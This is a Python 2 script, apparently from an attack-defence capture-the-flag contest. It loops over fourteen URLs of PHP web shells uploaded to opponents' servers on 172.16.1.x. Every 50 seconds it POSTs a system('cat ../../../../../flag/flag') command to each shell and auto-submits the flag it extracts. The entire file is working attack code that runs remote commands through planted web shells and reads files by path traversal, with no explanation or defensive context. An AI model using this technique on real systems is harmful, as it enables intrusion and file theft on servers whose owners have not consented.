import requests
import submit
import re
from time import sleep
exploit_list = [
    "http://172.16.1.1:20002/Images/attached/file/20170417/20170417102649_43578.php",
    "http://172.16.1.2:20002/Images/attached/file/20170417/20170417102427_88953.php",
    "http://172.16.1.3:20002/Images/attached/file/20170417/20170417102937_62515.php",
    "http://172.16.1.6:20002/Images/attached/file/20170417/20170417105205_39945.php",
    "http://172.16.1.7:20002/Images/attached/file/20170417/20170417105413_84636.php",
    "http://172.16.1.9:20002/Images/attached/file/20170417/20170417100455_94716.php",
    "http://172.16.1.10:20002/Images/attached/file/20170417/20170417104946_28230.php",
    "http://172.16.1.12:20002/Images/attached/file/20170417/20170417101655_14246.php",
    "http://172.16.1.13:20002/Images/attached/file/20170417/20170417103205_75413.php",
    "http://172.16.1.14:20002/Images/attached/file/20170417/20170417103457_67434.php",
    "http://172.16.1.15:20002/Images/attached/file/20170417/20170417103649_26577.php",
    "http://172.16.1.16:20002/Images/attached/file/20170417/20170417103803_54416.php",
    "http://172.16.1.18:20002/Images/attached/file/20170417/20170417104413_55070.php",
    "http://172.16.1.20:20002/Images/attached/file/20170417/20170417104644_18029.php",
]

mat = re.compile(".*([0-9a-zA-Z]{60}).*")

def crack_oneword():
    for i in exploit_list:
        r = requests.post(i, data={"c": 'system("cat ../../../../../flag/flag");'})
        a = mat.findall(r.content)
        if len(a) > 0:
           submit.submit(a[0])
        else:
            print i


while True:
    crack_oneword()
    sleep(50)